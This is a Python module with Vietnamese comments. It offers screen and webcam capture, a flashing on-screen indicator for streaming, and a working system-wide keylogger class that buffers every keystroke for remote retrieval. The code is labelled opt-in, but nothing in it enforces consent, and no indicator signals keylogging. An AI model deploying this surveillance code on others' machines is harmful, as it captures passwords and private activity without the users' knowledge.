"""Opt-in screen, camera, visual indicators, and secure keylogger utilities."""

from __future__ import annotations

import threading
import tkinter as tk
from typing import Optional

import cv2
import mss
import mss.tools
from pynput import keyboard


class VisualIndicator:
    """Tạo chỉ báo trực quan hiển thị trên màn hình máy bị điều khiển (Xanh lá: Livestream, Đỏ: Webcam)."""

    def __init__(self, color: str = "green", label_text: str = "STREAM ACTIVE") -> None:
        self.color = color
        self.label_text = label_text
        self._thread: Optional[threading.Thread] = None
        self._root: Optional[tk.Tk] = None
        self._running = False

    def start(self) -> None:
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._run_ui, daemon=True)
        self._thread.start()

    def _run_ui(self) -> None:
        try:
            self._root = tk.Tk()
            self._root.overrideredirect(True)
            self._root.attributes("-topmost", True)
            self._root.attributes("-alpha", 0.85)
            
            # Đặt ở góc trên bên phải màn hình
            screen_w = self._root.winfo_screenwidth()
            self._root.geometry(f"220x40+{screen_w - 240}+20")
            self._root.configure(bg=self.color)

            label = tk.Label(
                self._root,
                text=f"● {self.label_text}",
                fg="white",
                bg=self.color,
                font=("Arial", 10, "bold")
            )
            label.pack(expand=True, fill="both")

            # Hiệu ứng nhấp nháy chớp tắt
            def flash():
                if not self._running or not self._root:
                    return
                current_bg = self._root.cget("bg")
                next_bg = "#111111" if current_bg == self.color else self.color
                self._root.configure(bg=next_bg)
                label.configure(bg=next_bg)
                self._root.after(500, flash)

            self._root.after(500, flash)
            self._root.mainloop()
        except Exception:
            pass

    def stop(self) -> None:
        self._running = False
        if self._root:
            try:
                self._root.after(0, self._root.destroy)
            except Exception:
                pass


def capture_primary_screen_png() -> bytes:
    """Chụp ảnh màn hình đơn điểm."""
    try:
        with mss.mss() as screen_capture:
            primary_monitor = screen_capture.monitors[1]
            image = screen_capture.grab(primary_monitor)
            return mss.tools.to_png(image.rgb, image.size)
    except mss.exception.ScreenShotError as exc:
        raise RuntimeError(f"Unable to capture primary screen: {exc}") from exc


def capture_camera_frame(camera_index: int = 0):
    """Chụp 1 khung hình từ Webcam."""
    camera = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
    try:
        if not camera.isOpened():
            raise RuntimeError(f"Unable to open camera {camera_index}")
        success, frame = camera.read()
        if not success or frame is None:
            raise RuntimeError(f"Camera {camera_index} did not return a frame")
        return frame
    finally:
        camera.release()


class RemoteKeylogger:
    """Thread-safe keylogger thu thập phím bấm."""

    def __init__(self) -> None:
        self._buffer: list[str] = []
        self._lock = threading.Lock()
        self._listener: keyboard.Listener | None = None
        self._is_running = False

    def _on_press(self, key: keyboard.Key | keyboard.KeyCode | None) -> None:
        with self._lock:
            try:
                if isinstance(key, keyboard.KeyCode) and key.char:
                    self._buffer.append(key.char)
                elif key == keyboard.Key.space:
                    self._buffer.append(" ")
                elif key == keyboard.Key.enter:
                    self._buffer.append("\n[ENTER]\n")
                elif key == keyboard.Key.backspace:
                    if self._buffer:
                        self._buffer.pop()
                elif key == keyboard.Key.tab:
                    self._buffer.append("\t")
                else:
                    self._buffer.append(f"[{key.name.upper()}]")
            except Exception:
                pass

    def start(self) -> None:
        with self._lock:
            if self._is_running:
                return
            self._buffer.clear()
            self._listener = keyboard.Listener(on_press=self._on_press)
            self._listener.start()
            self._is_running = True

    def get_and_clear(self) -> str:
        with self._lock:
            data = "".join(self._buffer)
            self._buffer.clear()
            return data

    def stop(self) -> None:
        with self._lock:
            if self._is_running and self._listener:
                self._listener.stop()
                self._listener = None
            self._is_running = False
            self._buffer.clear()

    @property
    def is_running(self) -> bool:
        with self._lock:
            return self._is_running